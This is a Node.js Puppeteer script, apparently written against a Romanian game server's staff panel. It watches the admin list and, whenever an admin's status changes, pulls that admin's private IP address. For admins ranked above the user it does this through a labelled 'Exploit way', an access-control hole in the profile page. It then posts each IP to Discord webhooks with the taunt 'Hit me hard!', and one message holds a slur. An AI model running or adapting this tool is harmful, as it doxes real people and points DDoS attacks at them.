/*
	~ 
	~ Admin Tracker
	~ 
	~ Scope: Passive listener
	~ 
	~ Status: Available for General Public (partially declassified)
	~ 
*/
//imports
const fs = require('fs');
const puppeteer = require('puppeteer');
const path = require('path');
const jsonDiff = require('json-diff')
const _webhook = require("webhook-discord");

//config & cache consts
const config_path = "config/account.json";
const configTemplate = {"account":{"username":"","password":""},"broadcasts":[]};
const cacheDir = "cache";

//browser consts
const CHROME_EXEC_PATH = "/usr/bin/google-chrome"; //use google chrome instead of chromium
const DEFAULT_USER_DATA_DIR = path.resolve(__dirname, "config/profile");
const SAVE_SS_PATH = "debug";
const HEADLESS = false;
const PANEL_URL = "https://panel.b-hood.ro";
const URL_STAFF = "/staff";
const URL_USER_PART = "/user/profile";

//global vars
var config = null;
var onceDialog = false;

//funcs
function getConfig()
{
	if(!fs.existsSync(config_path))
	{
		var dir = config_path.split("/")[0];
		if(!fs.existsSync(dir))
			fs.mkdirSync(dir)
			
		console.log(config_path + "doesn't exist. Let's create it.");
		fs.writeFileSync(config_path, JSON.stringify(configTemplate), 'utf8');
	}
	return JSON.parse(fs.readFileSync(config_path, 'utf8'))
}

async function readCache(file)
{
	if(!fs.existsSync(cacheDir))
		fs.mkdirSync(cacheDir);
	
	var file = cacheDir + "/" + file + ".json";
	if(!fs.existsSync(file))
		return null;

	var ret = JSON.parse(fs.readFileSync(file, 'utf8'));
	if(!ret)
		return null;
	return ret;
}

async function writeCache(name, data)
{
	if(!fs.existsSync(cacheDir))
		fs.mkdir(cacheDir);
	
	var name = cacheDir + "/" + name + ".json";
	var ret = fs.writeFile(name, JSON.stringify(data), err => {
		if(err)
			return false;
		return true;
	});
	return ret;
}

async function checkIsCached(name, dataToCompare)
{
	var cache = await readCache(name);
	return { status: !(JSON.stringify(cache) !== JSON.stringify(dataToCompare)), diff: jsonDiff.diff(cache, dataToCompare) };
}

const snooze = ms => new Promise(resolve => setTimeout(resolve, ms));

//Mainstream

//Update config everytime in case we add more broadcasts
(async () => {
	config = getConfig();
	if(!config)
		throw new Error("Invalid config!");
	snooze(10000);
})();

//Deploy browser aka "the main service"
(async () => {
	try
	{
		const browser = await puppeteer.launch({
			executablePath: CHROME_EXEC_PATH,
			userDataDir: DEFAULT_USER_DATA_DIR,
			headless: HEADLESS,
			defaultViewport: {
				width: 1024,
				height: 768,
			},
			args: ['--no-sandbox'],
			ignoreHTTPSErrors: true, //oh really
		});
		const page = (await browser.pages())[0];
		await page.setViewport({
			width: 1024,
			height: 768,
		});
		await page.setDefaultNavigationTimeout(0); //unlimited

		//Go to panel
		await page.goto(PANEL_URL);

		//Find "DDoS Protection" and bypass it?
		var matches = (await page.content()).match(/DDoS Protection/);
		const bannerSelector = "img[alt=homepage]";
		var banner;
		if(matches)
		{
			console.log("We have BlazingFast DDoS Protection, let's bypass it...");
			
			await page.waitForNavigation();
			
			banner = await page.$(bannerSelector);
			
			while(banner === null)
				banner = await page.$(bannerSelector);
			
			console.log("Bypassed");
		}
		else
		{
			banner = await page.$(bannerSelector);
			if(banner !== null)
				console.log("Already bypassed...");
			else
				throw new Error("Can't find banner?");
		}
		
		//Let's check if we're logged in
		matches = (await page.content()).match(/Guest/);
		if(matches)
		{
			//Try to login
			const guestSelector = "a[class='nav-link dropdown-toggle text-muted waves-effect waves-dark']";
			const loginSelector = "a[data-target='#login']";
			await page.$eval(guestSelector, guestBtn => guestBtn.click());
			await page.$eval(loginSelector, loginBtn => loginBtn.click());

			//Insert credentials
			const setUserFunc = 'document.querySelector("input[name=login_username]").value = "' + config.account.username + '"';
			const setPassFunc = 'document.querySelector("input[name=login_password]").value = "' + config.account.password + '"';
			const inputRememberSelector = "label[for=checkbox-signup]";
			await page.waitForFunction(setUserFunc);
			await page.waitForFunction(setPassFunc);
			await page.$eval(inputRememberSelector, rememberInput => rememberInput.click()); // ????

			//Try to login?
			const loginSubmitSelector = "button[class='btn btn-info btn-lg btn-block text-uppercase waves-effect waves-light']";
			await page.$eval(loginSubmitSelector, loginBtn => loginBtn.click());

			//Wait...
			await page.waitForNavigation();

			//Let's check if we really logged in?
			matches = (await page.content()).match(/Welcome Back/);
			if(!matches)
				throw new Error("Not logged in or we need to handle PIN?"); //TODO: Handle the PIN
		}
		else
			console.log("Already logged in...");

		//whoami
		const whoSelector = "div.profile-text > h4";
		var who = await page.$eval(whoSelector, whoContent => whoContent.textContent);
		console.log("Logged in as: " + who);

		while(true)
		{
			await page.goto(PANEL_URL + URL_STAFF);
			var admins = await page.$$eval("div#tab-admins table tbody tr", rows => {
				return Array.from(rows, row => {
					const columns = row.querySelectorAll("td");
					return Array.from(columns, column => column.innerText);
				});
			});
			
			var cacheAdmins = [];
			var requiredAdminLevel;
			for(var i = 0; i < admins.length; i ++)
			{
				const adminStatusKey = 0;
				const adminNameKey = 2;
				const adminLevelKey = 3;
				//console.log(admins[i][adminNameKey] + " (A" + parseInt(admins[i][adminLevelKey]) + ") is " + admins[i][adminStatusKey].toLowerCase());
				if(admins[i][adminNameKey] === who)
					requiredAdminLevel = parseInt(admins[i][adminLevelKey]);
				cacheAdmins.push([admins[i][adminNameKey], parseInt(admins[i][adminLevelKey]), admins[i][adminStatusKey].toLowerCase()]);
			}

			var cacheResult;
			cacheResult = await checkIsCached("admins", cacheAdmins);
			if(!cacheResult.status)
			{
				//make diff & broadcast
				for(var i = 0; i < cacheResult.diff.length; i++)
				{
					var change = cacheResult.diff[i][0];
					if(change === "+")
					{
						var data = cacheResult.diff[i][1];
						var _log = data[0] + " (" + data[1] + ") is " + data[2];
						console.log(_log);
						if(data[0] === who)
							continue;
						for(var j = 0; j < config.broadcasts.length; j++)
						{
							var broadcast = config.broadcasts[j];
							const Hook = new _webhook.Webhook(broadcast);
							const msg = new _webhook.MessageBuilder().setName("B-HOOD Admin Update").setText(_log); //TODO: Avatar
							await Hook.send(msg);
							await page.waitForTimeout(1000);
						}
						//Let's take the IP now
						var name = data[0];
						var admLevel = data[1];
						await page.goto(PANEL_URL + URL_USER_PART + "/" + name);
						var bIpFound = false;
						var _ip;
						var failed = false;
						if(admLevel <= requiredAdminLevel) //ez way
						{
							const manageSelector = "a[href='#manage']";
							const ipLogsSelector = "a[class=_ipl";
							await page.$eval(manageSelector, manageBtn => manageBtn.click());
							await page.$eval(ipLogsSelector, ipLogsBtn => ipLogsBtn.click());
							const ipSelector = "table#DataTables_Table_0 > tbody > tr > td";
							await page.waitForSelector(ipSelector);
							_ip = await page.$eval(ipSelector, ipText => ipText.textContent);
							bIpFound = true;
						}
						else //Exploit way
						{
							const propertiesSelector = "a[href='#profile']"; //stupid
							const infoExploitSelector = "i[class='fa fa-info _el text-danger']"; //fr???
							await page.$eval(propertiesSelector, propertiesBtn => propertiesBtn.click());
							await page.$eval(infoExploitSelector, infoBtn => infoBtn.click());
							if(!onceDialog)
							{
								await page.on('dialog', async dialog => {
									await dialog.accept();
								});
								onceDialog = true;
							}
							const searchSelector = "input[aria-controls=DataTables_Table_0]";
							await page.waitForSelector(searchSelector);
							await page.$eval(searchSelector, search => search.value = "");
							await page.focus(searchSelector);
							await page.keyboard.press('Enter');
							const ipSelector = "table#DataTables_Table_0 > tbody > tr > td:nth-child(3)";
							await page.waitForSelector(ipSelector).catch(err => { failed = true; });
							if(!failed)
							{
								_ip = await page.$eval(ipSelector, ipText => ipText.textContent);
								if(_ip == null || _ip == "null")
								{
									bIpFound = false;
									failed = true;
								}
								else
									bIpFound = true;
							}
							else
								bIpFound = false;
						}
						if(bIpFound)
						{
							console.log(name + " >> " + _ip);
							_log = "That's my IP: " + _ip + "! Hit me hard!";
							for(var j = 0; j < config.broadcasts.length; j++)
							{
								var broadcast = config.broadcasts[j];
								const Hook = new _webhook.Webhook(broadcast);
								const msg = new _webhook.MessageBuilder().setName(name).setText(_log); //TODO: Avatar
								await Hook.send(msg);
								await page.waitForTimeout(1000);
							}
						}
						else
						{
							console.log(name + " >> no ip");
							_log = "You don't have my IP fag! GTFO!";
							for(var j = 0; j < config.broadcasts.length; j++)
							{
								var broadcast = config.broadcasts[j];
								const Hook = new _webhook.Webhook(broadcast);
								const msg = new _webhook.MessageBuilder().setName(name).setText(_log); //TODO: Avatar
								await Hook.send(msg);
								await page.waitForTimeout(1000);
							}
						}
					}
				}

				//write cache
				await writeCache("admins", cacheAdmins);
			}
			await page.waitForTimeout(20000);
		}

		await page.screenshot({path: SAVE_SS_PATH + '/' + 'main.png'}); //Use it for debugging
		await browser.close();
	}
	catch (e)
	{
		console.error(e);
	}
})();
